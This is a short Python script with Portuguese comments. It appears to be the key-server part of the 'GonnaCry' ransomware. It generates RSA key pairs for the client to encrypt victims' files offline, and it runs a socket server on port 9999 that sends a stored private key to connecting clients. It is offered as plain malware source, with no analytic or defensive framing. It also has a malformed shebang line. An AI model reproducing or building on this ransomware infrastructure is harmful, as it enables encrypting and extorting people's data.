#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho
import subprocess, random, socket

from Crypto.PublicKey import RSA
import os

def conexao(meuIP):
    # servidor
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((meuIP,9999))
    s.listen(1)
    print('Servidor rodando')
    sc, address = s.accept()

    f = open ("CHAVE_PRIVADA_SERVIDOR.txt", "rb")
    l = f.read(1024)
    while (l):
        sc.send(l)
        l = f.read(1024)
    s.close()



# Código para gerar as chaves.
# Se você rodar ele, copie a chave publica gerada, para a pasta GonnaCry_1.0
# pois o cliente deve ter a chave pública do servidor
# assim criptografando mesmo quando o usuario não tem conexão com a internet
def gera_chaves():
    chave = RSA.generate(1024)
    chave_privada=chave.exportKey('DER')
    chave_publica=chave.publickey().exportKey('DER')
    f=open('chave_privada.txt','wb')
    f.write(chave_privada)
    f.close()
    f=open('chave_publica.txt','wb')
    f.write(chave_publica)
    f.close()



# USAR IFCONFIG
while True:
    conexao('localhost')
#gera_chaves()
